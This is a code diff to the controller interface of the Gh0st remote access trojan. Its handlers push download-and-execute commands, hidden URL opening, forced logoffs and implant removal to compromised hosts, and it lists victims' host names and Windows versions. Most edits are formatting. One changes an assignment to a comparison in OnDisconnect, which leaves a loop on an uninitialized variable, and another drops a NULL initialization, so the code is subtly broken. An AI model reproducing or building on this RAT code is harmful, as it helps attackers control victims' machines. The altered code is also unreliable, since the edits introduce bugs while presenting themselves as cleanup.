@@ -133,7 +133,6 @@ Cgh0stView::~Cgh0stView()
 
 BOOL Cgh0stView::PreCreateWindow(CREATESTRUCT& cs)
 {
-	// TODO: Modify the Window class or styles here by modifying
 	//  the CREATESTRUCT cs
 	cs.style |= LVS_REPORT;
 	return CListView::PreCreateWindow(cs);
@@ -146,7 +145,6 @@ void Cgh0stView::OnDraw(CDC* pDC)
 {
 	Cgh0stDoc* pDoc = GetDocument();
 	ASSERT_VALID(pDoc);
-	// TODO: add draw code for native data here
 }
 
 void Cgh0stView::SetColumnNumeric(int iCol)
@@ -218,8 +216,6 @@ Cgh0stDoc* Cgh0stView::GetDocument() // non-debug version is inline
 
 LRESULT Cgh0stView::OnMyInitialUpdate(WPARAM, LPARAM)
 {
-	Cgh0stView* pView = this;
-
 	// Add Connects Window
 	//((CMainFrame*)AfxGetApp()->m_pMainWnd)->AddView("Connections", this, "Connections Users");
 
@@ -339,18 +335,17 @@ TCHAR szPath[256];
 
 int __stdcall ReadData(TCHAR szFile[], char **data)
 {
-	HANDLE hFile;
 	TCHAR FileName[256];
 
 	wsprintf(FileName, _T("%s\\%s"), szPath, szFile);
 
-	hFile = CreateFile(FileName,
-		GENERIC_ALL,
-		FILE_SHARE_READ,
-		(LPSECURITY_ATTRIBUTES)NULL,
-		OPEN_EXISTING,
-		FILE_ATTRIBUTE_NORMAL,
-		(HANDLE)NULL);
+	HANDLE hFile = CreateFile(FileName,
+	                          GENERIC_ALL,
+	                          FILE_SHARE_READ,
+	                          (LPSECURITY_ATTRIBUTES)NULL,
+	                          OPEN_EXISTING,
+	                          FILE_ATTRIBUTE_NORMAL,
+	                          (HANDLE)NULL);
 
 	if (hFile != INVALID_HANDLE_VALUE)
 	{
@@ -641,7 +636,7 @@ LRESULT Cgh0stView::OnAddToList(WPARAM wParam, LPARAM lParam)
 		// 主机名
 		m_pListCtrl->SetItemText(i, 1, LoginInfo->HostName);
 
-		TCHAR *pszOS = NULL;
+		TCHAR *pszOS;
 		if (LoginInfo->OsVerInfoEx.dwPlatformId == VER_PLATFORM_WIN32_NT)
 		{
 			if (LoginInfo->OsVerInfoEx.dwMajorVersion <= 4)
@@ -669,7 +664,7 @@ LRESULT Cgh0stView::OnAddToList(WPARAM wParam, LPARAM lParam)
 				pszOS,
 				LoginInfo->OsVerInfoEx.wServicePackMajor,
 				LoginInfo->OsVerInfoEx.dwBuildNumber
-				);
+			);
 		}
 		else
 		{
@@ -793,7 +788,7 @@ void Cgh0stView::OnDownexec()
 		//return;
 	}
 
-	int nPacketLength = (dlg.m_str.GetLength() + 1)*sizeof(TCHAR) + 1;
+	int nPacketLength = (dlg.m_str.GetLength() + 1) * sizeof(TCHAR) + 1;
 	LPBYTE lpPacket = new BYTE[nPacketLength];
 	lpPacket[0] = COMMAND_DOWN_EXEC;
 	memcpy(lpPacket + 1, (TCHAR*)dlg.m_str.GetBuffer(0), nPacketLength - 1);
@@ -805,7 +800,6 @@ void Cgh0stView::OnDownexec()
 
 void Cgh0stView::OnRemove()
 {
-	// TODO: Add your command handler code here
 	if (MessageBox(_T("确认卸载服务端?"), _T("Warning"), MB_YESNO | MB_ICONWARNING) == IDNO)
 		return;
 
@@ -820,7 +814,6 @@ void Cgh0stView::RemoveHost()
 
 void Cgh0stView::OnLogoff()
 {
-	// TODO: Add your command handler code here
 	BYTE bToken[2];
 	bToken[0] = COMMAND_SESSION;
 	bToken[1] = EWX_LOGOFF | EWX_FORCE;
@@ -873,7 +866,7 @@ void Cgh0stView::OnOpenUrlHide()
 		//return;
 	}
 
-	int nPacketLength = (dlg.m_str.GetLength() + 1)*sizeof(TCHAR) + 1;
+	int nPacketLength = (dlg.m_str.GetLength() + 1) * sizeof(TCHAR) + 1;
 	LPBYTE lpPacket = new BYTE[nPacketLength];
 	lpPacket[0] = COMMAND_OPEN_URL_HIDE;
 	memcpy(lpPacket + 1, (TCHAR*)dlg.m_str.GetBuffer(0), nPacketLength - 1);
@@ -896,7 +889,7 @@ void Cgh0stView::OnOpenUrlShow()
 		return;
 	}
 
-	int nPacketLength = (dlg.m_str.GetLength() + 1)*sizeof(TCHAR) + 1;
+	int nPacketLength = (dlg.m_str.GetLength() + 1) * sizeof(TCHAR) + 1;
 	LPBYTE lpPacket = new BYTE[nPacketLength];
 	lpPacket[0] = COMMAND_OPEN_URL_SHOW;
 	memcpy(lpPacket + 1, (TCHAR*)dlg.m_str.GetBuffer(0), nPacketLength - 1);
@@ -925,11 +918,11 @@ void Cgh0stView::OnRenameRemark()
 		return;
 
 	int		nPacketLength = dlg.m_str.GetLength() + 2;
-	LPBYTE	lpPacket = new BYTE[nPacketLength*sizeof(TCHAR)];
+	LPBYTE	lpPacket = new BYTE[nPacketLength * sizeof(TCHAR)];
 	lpPacket[0] = COMMAND_RENAME_REMARK;
-	memcpy(lpPacket + 1, dlg.m_str.GetBuffer(0), (nPacketLength - 1)*sizeof(TCHAR));
+	memcpy(lpPacket + 1, dlg.m_str.GetBuffer(0), (nPacketLength - 1) * sizeof(TCHAR));
 
-	SendSelectCommand(lpPacket, nPacketLength*sizeof(TCHAR));
+	SendSelectCommand(lpPacket, nPacketLength * sizeof(TCHAR));
 
 	POSITION pos = m_pListCtrl->GetFirstSelectedItemPosition();
 	while (pos)
@@ -968,7 +961,7 @@ void Cgh0stView::OnUpdateServer()
 void Cgh0stView::OnDisconnect()
 {
 	POSITION pos;
-	for (; pos = m_pListCtrl->GetFirstSelectedItemPosition();)
+	for (; pos == m_pListCtrl->GetFirstSelectedItemPosition();)
 	{
 		m_pListCtrl->DeleteItem(m_pListCtrl->GetNextSelectedItem(pos));
 	}
@@ -997,7 +990,7 @@ void Cgh0stView::OnSortProcess()
 		return;
 	dlg.m_str.MakeLower();
 
-	int		nPacketLength = (dlg.m_str.GetLength() + 1)*sizeof(TCHAR) + 1;
+	int		nPacketLength = (dlg.m_str.GetLength() + 1) * sizeof(TCHAR) + 1;
 	LPBYTE	lpPacket = new BYTE[nPacketLength];
 	lpPacket[0] = COMMAND_SORT_PROCESS;
 	memcpy(lpPacket + 1, (TCHAR*)dlg.m_str.GetBuffer(0), nPacketLength - 1);
@@ -1021,7 +1014,7 @@ void Cgh0stView::OnSortWindow()
 		return;
 	}
 
-	int		nPacketLength = (dlg.m_str.GetLength() + 1)*sizeof(TCHAR) + 1;
+	int		nPacketLength = (dlg.m_str.GetLength() + 1) * sizeof(TCHAR) + 1;
 	LPBYTE	lpPacket = new BYTE[nPacketLength];
 	lpPacket[0] = COMMAND_SORT_WINDOW;
 	memcpy(lpPacket + 1, (TCHAR*)dlg.m_str.GetBuffer(0), nPacketLength - 1);
